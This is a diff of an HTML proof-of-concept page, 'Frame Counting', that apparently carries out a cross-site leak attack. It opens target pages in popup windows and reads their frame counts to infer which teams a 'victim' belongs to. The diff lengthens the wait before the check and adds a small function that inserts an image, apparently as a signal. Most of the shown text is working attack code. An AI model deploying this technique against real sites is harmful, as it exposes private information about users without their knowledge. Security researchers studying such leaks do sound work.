@@ -3,10 +3,19 @@
         <title>Frame Counting</title>
     </head>
     <body>
-        <h2>Frame Counting</h2>
+        <script>
+            function panik(url){
+            var img = document.createElement("img");
+            img.src = url;
+            var src = document.getElementById("header");
+            src.appendChild(img);
+        }
+        </script>
         <center>
+        <h2>Frame Counting</h2>
             <h5>Teams where victim is a member</h5>
             <div id="output"></div>
+            <div id="header"></div>
         </center>
         <center>
             <h5>Teams where victim is not a member</h5>
@@ -38,7 +47,7 @@
                     data[i]=window.open(targets[i],i,"width=700,height=700");
                 }
                 console.log("Loading page")
-                sleep(10000).then(() => {
+                sleep(20000).then(() => {
                 console.log("sleep done")
                     for(var j=0;j< data.length;j++){
                         if(data[j].window.length>0){
@@ -51,6 +60,7 @@
                         }
                     }
                 });
+                panik('panic.png')
             }
         </script>
     </body>
